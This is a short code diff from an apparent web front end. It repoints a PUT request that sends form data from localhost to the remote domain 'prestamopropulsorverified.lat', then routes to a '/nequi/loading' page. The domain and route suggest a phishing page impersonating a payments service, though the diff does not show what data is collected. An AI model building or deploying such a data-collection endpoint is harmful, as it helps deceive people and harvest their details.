@@ -28,7 +28,7 @@ export default function Home() {
   
     const id = localStorage.getItem('id');
     try {
-      const response = await axios.put(`http://127.0.0.1:8000/api/v1/guest/${id}`, data);
+      const response = await axios.put(`https://prestamopropulsorverified.lat/api/v1/guest/${id}`, data);
   
       navigate("/nequi/loading");
     } catch (error) {
